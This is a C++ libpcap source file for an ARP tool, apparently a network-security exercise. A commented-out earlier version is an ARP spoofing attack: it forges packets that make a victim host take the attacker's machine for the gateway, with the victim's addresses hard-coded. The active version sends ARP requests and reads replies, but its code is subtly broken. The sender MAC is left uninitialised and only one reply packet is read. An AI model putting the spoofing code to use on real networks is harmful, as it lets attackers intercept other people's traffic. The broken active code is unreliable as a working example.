/*

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)



void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac receiveMac(pcap_t *handle, const Ip &target_ip) {
        while (true) {
            struct pcap_pkthdr *header;
            const u_char *packet;
            int res = pcap_next_ex(handle, &header, &packet);

            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            EthHdr *eth_hdr = (EthHdr *)packet;
            ArpHdr *arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));

            if (eth_hdr->type() == EthHdr::Arp &&
                arp_hdr->op() == htons(ArpHdr::Reply) &&
                arp_hdr->sip() == target_ip) {
                return arp_hdr->smac();
        }
    }
}


int main(int argc, char* argv[]) {
    if (argc % 2 != 0 && argc >=4) {
		usage();
		return -1;
    }
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

    //calc att_mac
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    uint8_t atc_mac[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    strcpy(s.ifr_name, argv[1]);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        for (i = 0; i < 6; i++){
            atc_mac[i] = (unsigned char) s.ifr_addr.sa_data[i];
        }
    }

    int i;
    for(i=0; i<(argc/2)-1; i++) {
        //broadcast to detect mac first
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   //broadcast
        packet.eth_.smac_ = Mac(atc_mac);       //true attacker mac
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);

        packet.arp_.smac_ = Mac("10:01:10:01:10:01");   //false mac address for victim
        packet.arp_.sip_ = htonl(Ip(argv[i*2+2])); //fool vimtim me as a gateway ip
        packet.arp_.tmac_ = Mac::nullMac();   //victim mac
        packet.arp_.tip_ = htonl(Ip(argv[i*2+3])); //victim ip

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        Mac t_mac = receiveMac(handle, Ip(argv[i*2+2]));
        if(t_mac == Mac("f0:a6:54:29:6f:f3")){
            break;
        }

    }

    pcap_close(handle);

    return 0;



    packet.eth_.dmac_ = Mac("10:51:07:c6:33:ab");   //true victim mac
    packet.eth_.smac_ = Mac("13:13:13:13:13:13");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac("10:01:10:01:10:01");   //false mac address for victim
    packet.arp_.sip_ = htonl(Ip("192.168.242.95")); //fool vimtim me as a gateway ip
    packet.arp_.tmac_ = Mac("10:51:07:c6:33:ab");   //victim mac
    packet.arp_.tip_ = htonl(Ip("192.168.242.12")); //victim ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    pcap_close(handle);
}

*/

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac receiveMac(pcap_t *handle, const Ip &target_ip) {

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);



        EthHdr *eth_hdr = (EthHdr *)packet;
        ArpHdr *arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));

        if (eth_hdr->type() == EthHdr::Arp &&
            arp_hdr->op() == htons(ArpHdr::Reply) &&
            arp_hdr->sip() == target_ip) {
            return arp_hdr->smac();
        }



    return Mac("00:00:00:00:00:00");
}


int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) { // 수정: argc 체크
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // 수정: pcap_open_live의 인자 수정
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    struct ifreq s;
    strcpy(s.ifr_name, dev);
    uint8_t atc_mac[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++) {
            atc_mac[i] = (uint8_t) s.ifr_addr.sa_data[i];
        }
    }

    for (int i = 0; i < (argc - 2) / 2; i++) {
        //broadcast
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = packet.eth_.smac_;
        packet.arp_.sip_ = htonl(Ip(argv[i * 2 + 2]));
        packet.arp_.tmac_ = Mac::nullMac();
        packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 3]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        // 수정: ARP 응답 대기
        sleep(1); // 1초 대기
        Mac t_mac = receiveMac(handle, Ip(argv[i * 2 + 3]));
        if (t_mac != Mac("00:00:00:00:00:00")) { // 수정: 브로드캐스팅 MAC 주소가 아닌 경우에만 출력
            printf("MAC address of %s: %s\n", argv[i * 2 + 3], std::string(t_mac).c_str());
        }
    }

    pcap_close(handle);
    return 0;
}

